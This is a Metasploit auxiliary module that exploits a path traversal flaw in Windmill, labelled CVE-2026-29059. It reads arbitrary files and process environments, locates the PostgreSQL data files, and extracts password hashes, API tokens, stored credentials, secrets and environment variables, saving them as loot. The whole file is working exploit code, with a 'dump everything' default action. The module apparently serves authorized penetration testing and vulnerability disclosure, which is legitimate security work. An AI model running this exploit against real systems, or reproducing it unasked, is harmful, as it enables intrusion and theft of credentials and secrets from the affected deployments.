
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Windmill CVE-2026-29059 path traversal file read and PostgreSQL dump
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Windmill
  include Msf::Exploit::Remote::HTTP::Windmill::Postgres
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windmill Arbitrary File Read (Windfall)',
        'Description' => %q{
          Windfall - Exploits CVE-2026-29059 path traversal in Windmill to read
          arbitrary files. DUMP_ALL extracts environment variables and PostgreSQL
          database contents including users, tokens, resources, and credentials.
        },
        'AKA' => ['Windfall'],
        'Author' => [
          'Valentin Lobstein' # Vulnerability discovery & Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-29059'],
          ['URL', 'https://github.com/Chocapikk/Windfall'],
          ['URL', 'https://chocapikk.com/posts/2026/windfall-nextcloud-flow-windmill-rce/']
        ],
        'DisclosureDate' => '2026-01-10',
        'Actions' => [
          ['READ', { 'Description' => 'Read a single file' }],
          ['DUMP_ENV', { 'Description' => 'Dump environment variables' }],
          ['DUMP_SECRETS', { 'Description' => 'Dump secrets from global_settings' }],
          ['DUMP_USERS', { 'Description' => 'Dump users and password hashes' }],
          ['DUMP_TOKENS', { 'Description' => 'Dump API tokens' }],
          ['DUMP_RESOURCES', { 'Description' => 'Dump resources (credentials)' }],
          ['DUMP_ALL', { 'Description' => 'Dump everything' }]
        ],
        'DefaultAction' => 'DUMP_ALL',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('FILEPATH', [false, 'File path to read', '/etc/passwd']),
      OptString.new('DATABASE', [false, 'PostgreSQL database name (auto-detected if not set)']),
      OptInt.new('MAX_ROWS', [false, 'Maximum rows to display per table', 10])
    ])
  end

  def run
    fail_with(Failure::Unknown, 'Not detected') unless windmill_detect_deployment
    dispatch_action
  end

  private

  def dispatch_action
    case action.name
    when 'READ' then read_file
    when 'DUMP_ENV' then dump_env
    when 'DUMP_SECRETS' then init_pg && dump_secrets
    when 'DUMP_USERS' then init_pg && dump_users
    when 'DUMP_TOKENS' then init_pg && dump_tokens
    when 'DUMP_RESOURCES' then init_pg && dump_resources
    when 'DUMP_ALL' then dump_all
    end
  end

  def read_file
    c = windmill_read_file(datastore['FILEPATH'])
    c ? print_good("#{c.length} bytes:\n\n#{c}") : fail_with(Failure::NotFound, 'Failed')
  end

  def dump_all
    dump_env
    return unless init_pg

    print_good("#{@schema.length} tables")
    @schema.select { |_, t| user_table?(t) }.each_value { |t| dump_table(t) }
  end

  def init_pg
    @pg = find_pg_path
    return false unless @pg

    @oid = find_db_oid
    return false unless @oid

    @schema = load_schema
    true
  end

  def dump_secrets
    tbl = find_windmill_table('global_settings')
    return print_warning('Table global_settings not found') unless tbl

    rows = read_windmill_table(tbl)
    secrets = pg_extract_secrets(rows)
    output('Secrets', %w[Name Value], secrets.to_a, 'global_settings')
  end

  def dump_users
    tbl = find_windmill_table('password')
    return print_warning('Table password not found') unless tbl

    rows = read_windmill_table(tbl)
    users = pg_extract_users(rows)
    users.each { |u| store_cred(u) }
    output('Users', %w[Email Hash], users.map { |u| [u[:email], "#{u[:hash][0, 50]}..."] }, 'password')
  end

  def dump_tokens
    tbl = find_windmill_table('token')
    return print_warning('Table token not found') unless tbl

    rows = read_windmill_table(tbl)
    tokens = pg_extract_tokens(rows)
    tokens.each { |t| report_note(host: rhost, type: 'windmill.token', data: t) }
    output('Tokens', %w[Email Token Label], tokens.map { |t| [t[:email], t[:token], t[:label]] }, 'token')
  end

  def dump_resources
    tbl = find_windmill_table('resource')
    return print_warning('Table resource not found') unless tbl

    rows = read_windmill_table(tbl)
    resources = pg_extract_resources(rows)
    resources.each { |r| report_note(host: rhost, type: 'windmill.resource', data: r) }
    output('Resources', %w[Path Type], resources.map { |r| [r[:path], r[:value].keys.join(', ')] }, 'resource')
  end

  def find_windmill_table(name)
    @schema.values.find { |t| t[:name] == name }
  end

  def read_windmill_table(tbl)
    pg_parse_table(windmill_read_file("#{@pg}/base/#{@oid}/#{tbl[:filenode]}"), tbl[:columns])
  end

  def user_table?(tbl)
    tbl[:kind] == 'r' && tbl[:oid] > 16_000 && tbl[:columns].any?
  end

  def find_pg_path
    (1..500).each do |pid|
      cmd = windmill_read_file("/proc/#{pid}/cmdline")
      next unless cmd&.include?('postgres') && cmd.include?('-D')

      return cmd.split("\x00")[cmd.split("\x00").index('-D') + 1]
    end
    print_warning('PostgreSQL not in container (external DB) - skipping DB dump')
    nil
  end

  def find_db_oid
    d = windmill_read_file("#{@pg}/global/#{pg_database_oid}")
    return print_warning('Cannot read pg_database') unless d

    db_name = target_database
    vprint_status("Using database: #{db_name}")
    oid = pg_find_db_oid(d, db_name)
    return print_warning("Database '#{db_name}' not found") unless oid

    oid
  end

  def target_database
    return datastore['DATABASE'] if datastore['DATABASE'].present?

    # Auto-detect based on deployment type
    windmill_deployment_type&.start_with?('flow') ? 'flow' : 'windmill'
  end

  def load_schema
    b = "#{@pg}/base/#{@oid}"
    tables = pg_parse_tables(windmill_read_file("#{b}/#{pg_class_oid}"))
    columns = pg_parse_columns(windmill_read_file("#{b}/#{pg_attribute_oid}"))
    pg_merge_schema(tables, columns)
  end

  def dump_env
    vars = find_env_vars
    if vars&.any?
      output('Environment', %w[Name Value], vars)
      report_env(vars)
    else
      print_warning('No environment variables found')
    end
  end

  def find_env_vars
    ['/proc/1/environ', '/proc/self/environ'].each do |path|
      content = windmill_read_file(path)
      next unless content

      vars = parse_env(content)
      return vars if vars.any?
    end
    nil
  end

  def parse_env(content)
    content.split("\x00").filter_map do |line|
      k, v = line.split('=', 2)
      [k, v.to_s[0, 80]] if v && env_key?(k)
    end
  end

  def report_env(vars)
    vars.each do |k, v|
      report_note(host: rhost, type: "windmill.env.#{k.downcase}", data: v)
      store_cred_from_env(k, v) if k.include?('SECRET') || k.include?('PASSWORD')
    end
  end

  def store_cred_from_env(key, value)
    create_credential(origin_type: :service, module_fullname: fullname, private_type: :password,
                      private_data: value, username: key, service_name: 'windmill',
                      address: rhost, port: rport, protocol: 'tcp', workspace_id: myworkspace_id)
  end

  def dump_table(tbl)
    rows = pg_parse_table(windmill_read_file("#{@pg}/base/#{@oid}/#{tbl[:filenode]}"), tbl[:columns])
    return if rows.empty?

    report_data(tbl[:name], rows)
    output("#{tbl[:name]} (#{rows.length})", tbl[:columns].map { |c| c[:name] }, rows, tbl[:name])
  end

  def report_data(name, rows)
    case name
    when 'password' then pg_extract_users(rows).each { |u| store_cred(u) }
    when 'token' then pg_extract_tokens(rows).each { |t| report_note(host: rhost, type: 'windmill.token', data: t) }
    when 'resource' then pg_extract_resources(rows).each do |r|
      report_note(host: rhost, type: 'windmill.resource', data: r)
    end
    end
  end

  def output(header, cols, rows, loot = nil)
    filtered = cols.reject { |c| c.to_s.include?('dropped') }
    tbl = Rex::Text::Table.new('Header' => header, 'Columns' => filtered)
    rows.first(datastore['MAX_ROWS']).each { |row| tbl << format_row(row, filtered) }
    print_line(tbl.to_s)
    save_loot(loot, rows) if loot
  end

  def format_row(row, cols)
    cols.map { |c| pg_format_cell(row.is_a?(Hash) ? row[c] : row[cols.index(c)]) }
  end

  def save_loot(name, rows)
    store_loot("windmill.#{name}", 'application/json', rhost, pg_safe_rows(rows).to_json, "#{name}.json")
  rescue StandardError
    nil
  end

  def store_cred(user)
    create_credential(origin_type: :service, module_fullname: fullname, private_type: :nonreplayable_hash,
                      private_data: user[:hash], username: user[:email], service_name: 'windmill',
                      address: rhost, port: rport, protocol: 'tcp', workspace_id: myworkspace_id, jtr_format: 'argon2')
  end

  def env_key?(key)
    %w[DATABASE SECRET KEY TOKEN PASSWORD URL].any? { |pat| key.to_s.upcase.include?(pat) }
  end
end
